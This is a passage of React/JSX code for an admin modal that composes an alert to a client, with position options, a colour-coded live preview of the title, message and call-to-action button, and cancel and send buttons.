                          borderWidth: alertForm.position === 'top' ? '2px' : '1px',
                          borderColor: alertForm.position === 'top' ? 'var(--brand-purple)' : 'var(--border-light)',
                        }}
                        onClick={() => setAlertForm({ ...alertForm, position: 'top' })}
                      >
                        ⬆ Top Banner
                      </button>
                    </div>
                  </div>
                </div>

                {/* LIVE UI DESIGN PREVIEW (Right inside the modal) */}
                <div>
                  <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '4px' }}>
                    <label className="form-label">Live UI Preview (How it looks on client&apos;s screen):</label>
                    <span style={{ fontSize: '10px', color: 'var(--brand-green)', fontWeight: 700 }}>● Instant Live Simulation</span>
                  </div>

                  {(() => {
                    const variantColor =
                      alertForm.variant === 'danger'
                        ? '#ef4444'
                        : alertForm.variant === 'success'
                        ? '#10b981'
                        : alertForm.variant === 'info'
                        ? '#3b82f6'
                        : '#f0b90b';

                    const isTop = alertForm.position === 'top';

                    return (
                      <div
                        style={{
                          background: '#090b0e',
                          borderRadius: '8px',
                          padding: isTop ? '12px 16px' : '22px 24px',
                          border: `2px solid ${variantColor}`,
                          boxShadow: `0 0 25px ${variantColor}44, 0 8px 30px rgba(0,0,0,0.7)`,
                          position: 'relative',
                          textAlign: 'center',
                          color: '#eaecef',
                          transition: 'all 0.2s ease',
                        }}
                      >
                        {/* Close button */}
                        <div style={{ position: 'absolute', top: '10px', right: '14px', color: '#848e9c', fontSize: '14px' }}>
                          ✕
                        </div>

                        {/* Title */}
                        <div
                          style={{
                            fontSize: '18px',
                            fontWeight: 700,
                            color: variantColor,
                            marginBottom: '6px',
                          }}
                        >
                          {alertForm.title}
                        </div>

                        {/* Message */}
                        <div style={{ fontSize: '13px', color: '#cfd6e0', marginBottom: '14px', maxWidth: '440px', margin: '0 auto 12px' }}>
                          {alertForm.body}
                        </div>

                        {/* Button */}
                        {alertForm.ctaText && (
                          <div style={{ display: 'inline-block' }}>
                            <span
                              style={{
                                display: 'inline-block',
                                padding: '8px 24px',
                                background: variantColor,
                                color: alertForm.variant === 'warning' || alertForm.variant === 'success' ? '#000000' : '#ffffff',
                                borderRadius: '6px',
                                fontWeight: 700,
                                fontSize: '13px',
                                boxShadow: '0 2px 10px rgba(0,0,0,0.3)',
                              }}
                            >
                              {alertForm.ctaText}
                            </span>
                          </div>
                        )}
                      </div>
                    );
                  })()}
                </div>
              </div>

              <div className="modal-footer">
                <button
                  type="button"
                  className="btn btn-secondary"
                  onClick={() => setShowAlertModal(false)}
                >
                  Cancel
                </button>
                <button
                  type="submit"
                  className="btn btn-primary"
                  style={{ background: 'var(--brand-purple)', padding: '10px 22px' }}
                >
                  🚀 Send Instant Alert to Client
                </button>
              </div>
            </form>
          </div>
        </div>
      )}
    </div>
  );
}
